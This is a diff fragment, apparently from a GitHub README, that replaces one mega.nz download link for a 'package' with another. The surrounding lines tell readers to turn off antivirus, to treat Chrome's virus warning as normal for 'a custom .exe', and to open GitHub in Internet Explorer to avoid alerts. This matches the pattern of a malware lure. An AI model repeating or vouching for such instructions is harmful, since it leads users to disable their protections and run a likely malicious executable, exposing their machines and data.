@@ -22,7 +22,7 @@ if ur av detects abnormal its bcuz its a modified .exe file so turn of av go to 
 some avs i have tested and nothing apart from 1 only bcuz its a modified .exe
 
 issues with chrome fix
-download package https://mega.nz/file/IuxUTa5B#CULTICk3sUA-tIjI8m5njk8vhwh2R0ZyfAp67R68E_k
+download package https://mega.nz/file/xiwi3TiR#4yRA2SRp5nv8MxajaU8Ef80k77oxvSChttWahl8K5vE
 or reopen github with internet explorer no alerts
 google chrome detects it as virus but thats normal as its a custom .exe
 please dont worry its normal for this to happen.
